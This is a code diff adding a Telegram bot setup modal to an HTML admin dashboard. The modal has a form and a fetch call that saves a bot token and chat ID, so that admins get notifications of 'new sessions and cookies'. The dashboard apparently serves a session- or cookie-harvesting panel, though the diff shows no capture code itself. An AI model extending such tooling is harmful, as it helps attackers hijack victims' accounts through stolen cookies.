@@ -2187,5 +2187,128 @@
             setInterval(loadSessions, 10000);
         });
     </script>
+
+    <!-- Admin Setup Modal (for normal admins on first login) -->
+    {% if needs_setup %}
+    <div id="adminSetupModal" class="modal" style="display: block; z-index: 5000;">
+        <div class="modal-content" style="max-width: 600px;">
+            <div class="modal-header">
+                <h2>🤖 Telegram Bot Setup</h2>
+                <span class="close" onclick="closeAdminSetupModal()">&times;</span>
+            </div>
+            <div class="modal-body">
+                <p style="color: rgba(255, 255, 255, 0.8); margin-bottom: 20px;">
+                    Configure your Telegram bot to receive notifications for new sessions and cookies.
+                </p>
+                
+                <div style="padding: 12px; background: rgba(59, 130, 246, 0.1); border-radius: 8px; border: 1px solid rgba(59, 130, 246, 0.3); margin-bottom: 20px; font-size: 13px;">
+                    <strong style="color: #3b82f6;">📋 Setup Instructions:</strong><br>
+                    <ol style="margin-top: 8px; padding-left: 20px; color: rgba(255, 255, 255, 0.7);">
+                        <li>Create a Telegram bot by messaging <a href="https://t.me/BotFather" target="_blank" style="color: #3b82f6;">@BotFather</a></li>
+                        <li>Use <code>/newbot</code> command and follow the instructions</li>
+                        <li>Copy the bot token provided by BotFather</li>
+                        <li>Start a chat with your bot and send any message</li>
+                        <li>Get your chat ID by messaging <a href="https://t.me/userinfobot" target="_blank" style="color: #3b82f6;">@userinfobot</a> or create a group and add your bot</li>
+                        <li>For groups, use <code>@getidsbot</code> to get the group chat ID</li>
+                    </ol>
+                </div>
+
+                <div id="setupError" style="display: none; padding: 12px; background: rgba(239, 68, 68, 0.1); border-radius: 8px; border: 1px solid rgba(239, 68, 68, 0.3); margin-bottom: 16px; color: #f97373; font-size: 13px;"></div>
+                <div id="setupSuccess" style="display: none; padding: 12px; background: rgba(34, 197, 94, 0.1); border-radius: 8px; border: 1px solid rgba(34, 197, 94, 0.3); margin-bottom: 16px; color: #22c55e; font-size: 13px;"></div>
+
+                <form id="adminSetupForm" onsubmit="saveAdminSetup(event); return false;">
+                    <div style="margin-bottom: 16px;">
+                        <label for="admin_telegram_bot_token" style="display: block; margin-bottom: 6px; color: #e5e7eb; font-size: 14px; font-weight: 500;">Telegram Bot Token</label>
+                        <input id="admin_telegram_bot_token" name="telegram_bot_token" type="password" 
+                               placeholder="123456789:ABCdefGHIjklMNOpqrsTUVwxyz"
+                               style="width: 100%; padding: 10px 12px; background: rgba(0, 0, 0, 0.3); border: 1px solid rgba(148, 163, 184, 0.3); border-radius: 6px; color: #e5e7eb; font-size: 14px;">
+                        <div style="margin-top: 4px; font-size: 12px; color: #9ca3af;">Optional: Leave empty to use global bot token from Settings</div>
+                    </div>
+                    <div style="margin-bottom: 20px;">
+                        <label for="admin_telegram_chat_id" style="display: block; margin-bottom: 6px; color: #e5e7eb; font-size: 14px; font-weight: 500;">Telegram Chat ID *</label>
+                        <input id="admin_telegram_chat_id" name="telegram_chat_id" type="text" 
+                               placeholder="-1001234567890 or 123456789" required
+                               style="width: 100%; padding: 10px 12px; background: rgba(0, 0, 0, 0.3); border: 1px solid rgba(148, 163, 184, 0.3); border-radius: 6px; color: #e5e7eb; font-size: 14px;">
+                        <div style="margin-top: 4px; font-size: 12px; color: #9ca3af;">Your personal chat ID (positive number) or group chat ID (negative number)</div>
+                    </div>
+                    <div style="display: flex; gap: 10px; justify-content: flex-end;">
+                        <button type="button" class="copy-btn" onclick="closeAdminSetupModal()" style="background: rgba(148, 163, 184, 0.2); border-color: rgba(148, 163, 184, 0.3);">Skip for Now</button>
+                        <button type="submit" class="copy-btn">Save Configuration</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function closeAdminSetupModal() {
+            const modal = document.getElementById('adminSetupModal');
+            if (modal) {
+                modal.style.display = 'none';
+            }
+        }
+
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            const modal = document.getElementById('adminSetupModal');
+            if (event.target == modal) {
+                closeAdminSetupModal();
+            }
+        }
+
+        async function saveAdminSetup(event) {
+            event.preventDefault();
+            
+            const errorDiv = document.getElementById('setupError');
+            const successDiv = document.getElementById('setupSuccess');
+            const form = document.getElementById('adminSetupForm');
+            
+            // Hide previous messages
+            errorDiv.style.display = 'none';
+            successDiv.style.display = 'none';
+            
+            const formData = new FormData(form);
+            const data = {
+                telegram_bot_token: formData.get('telegram_bot_token') || '',
+                telegram_chat_id: formData.get('telegram_chat_id') || ''
+            };
+            
+            if (!data.telegram_chat_id) {
+                errorDiv.textContent = 'Telegram chat ID is required.';
+                errorDiv.style.display = 'block';
+                return;
+            }
+            
+            try {
+                const response = await fetch('/api/admin/setup', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+                
+                const result = await response.json();
+                
+                if (response.ok && result.status === 'success') {
+                    successDiv.textContent = 'Telegram configuration saved successfully!';
+                    successDiv.style.display = 'block';
+                    
+                    // Reload page after 1.5 seconds
+                    setTimeout(() => {
+                        window.location.reload();
+                    }, 1500);
+                } else {
+                    errorDiv.textContent = result.message || 'Failed to save configuration. Please try again.';
+                    errorDiv.style.display = 'block';
+                }
+            } catch (error) {
+                errorDiv.textContent = 'An error occurred. Please try again.';
+                errorDiv.style.display = 'block';
+                console.error('Setup error:', error);
+            }
+        }
+    </script>
+    {% endif %}
 </body>
 </html>
